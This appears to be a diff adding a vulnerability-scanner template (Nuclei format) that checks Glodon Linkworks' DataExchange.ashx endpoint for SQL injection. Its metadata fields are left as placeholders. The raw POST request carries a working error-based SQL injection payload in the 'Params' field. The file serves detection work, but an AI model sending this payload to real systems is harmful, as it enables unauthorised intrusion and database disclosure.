@@ -1,0 +1,38 @@
+id: glodon-Linkworks-DataExchange-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+        Content-Type: multipart/form-data; boundary=12ef5586849044debc33731d4c32afd0
+        Content-Length: 283
+
+        --12ef5586849044debc33731d4c32afd0
+        Content-Disposition: form-data; name="SystemName"
+
+        BIM
+        --12ef5586849044debc33731d4c32afd0
+        Content-Disposition: form-data; name="Params"
+
+        <rootElement dir="1' and 1=user and 'Hami'='Hami">
+        </rootElement>
+        --12ef5586849044debc33731d4c32afd0--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'GB.LK.Document.WebSite'
+      - type: word
+        part: header
+        words:
+          - '200'
